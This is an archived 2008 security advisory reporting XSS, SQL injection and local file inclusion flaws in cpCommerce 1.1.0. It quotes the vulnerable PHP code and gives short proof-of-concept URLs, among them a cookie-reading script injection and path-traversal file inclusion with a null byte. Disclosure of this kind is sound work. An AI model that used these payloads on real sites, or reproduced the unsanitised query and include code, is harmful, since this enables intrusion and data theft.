<html><head><title>cpCommerce 1.1.0 (XSS/LFI) Multiple Remote Vulnerabilities</title></head><pre>########################## www.BugReport.ir #########################
#
#      AmnPardaz Security Research Team
#
# Title: cpCommerce Multiple Vulnerabilities
# Vendor: http://cpcommerce.cpradio.org
# Bugs: XSS, SQL Injection , Local File Inclusion
# Vulnerable Version: 1.1.0 (prior versions also may be affected)
# Exploitation: Remote with browser
# Fix: N/A
# Original Advisory: http://bugreport.ir/index.php?/34
######################################################################


####################
- Description:
####################

cpCommerce is an open-source e-commerce solution that is maintained by templates and modules.


####################
- Vulnerability:
####################

+--&gt;XSS
POC: http://localhost/v1.1.0/cpcommerce/calendar.php?obj=view.year&amp;month=2&amp;date=21&amp;year=2008&lt;script&gt;alert(document.cookie)&lt;/script&gt;


+--&gt;SQL Injection
Input passed to the &quot;id_product&quot;,&quot;id_manufacturer&quot; and &quot;id_category&quot; parameters in
functions/display_page.func.php is not properly sanitised before being used in SQL queries.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

Code Snippet:
functions/display_page.func.php Line#94-96

if (isset($_GET['id_product']) &amp;&amp; trim($_GET['id_product']) != &quot;&quot;) {
$product = $db_chooser-&gt;sql_query(&quot;select `id_category`, `id_manufacturer`, `name`, `description` from &quot; . &quot;&quot; . $db_chooser-&gt;Products() . &quot; where id_product='{$_GET['id_product']}' limit 1&quot;);


+--&gt; Local File Inclusion
Input passed to the &quot;language&quot; and &quot;action&quot; parameters is not properly verified
before being used to include files.
This can be exploited to include arbitrary files from local resources.

Code Snippet:
actions/language.act.php Line#14-16

  // Verify the Language file exists
  if (isset($_GET['language']) &amp;&amp; file_exists(&quot;{$folder}{$_GET['language']}&quot;))
    $_SESSION['cpLanguage'] = &quot;{$folder}{$_GET['language']}&quot;;

Code Snippet:
_functions.php Line#109-113

  ## Include Language File
  if (isset($_SESSION['cpLanguage']))
    require_once(&quot;{$config['document_root']}{$config['maindir']}{$_SESSION['cpLanguage']}&quot;);
  else
    require_once(&quot;{$config['document_root']}{$config['maindir']}{$config['language']}&quot;);

POC: http://localhost/v1.1.0/cpcommerce/?action=language&amp;language=../To%20DO%20LIST.txt

---------------------------------------

Code Snippet:
_functions.php Line#148-152
  ## Run Requested Action
  if (isset($_GET['action'])) $_POST['action'] = $_GET['action'];
  if (isset($_POST['submit']) || isset($_POST['action']))
    if (isset($_POST['action'])) {
      require_once(&quot;{$config['document_root']}{$config['maindir']}{$config['actions']}{$_POST['action']}.act.php&quot;);

POC: http://localhost/v1.1.0/cpcommerce/category.php?action=../To%20DO%20LIST.txt%00

####################
- Credit :
####################
AmnPardaz Security Research Team
Contact: admin[4t}bugreport{d0t]ir
www.BugReport.ir
www.AmnPardaz.com

# milw0rm.com [2008-04-13]</pre></html>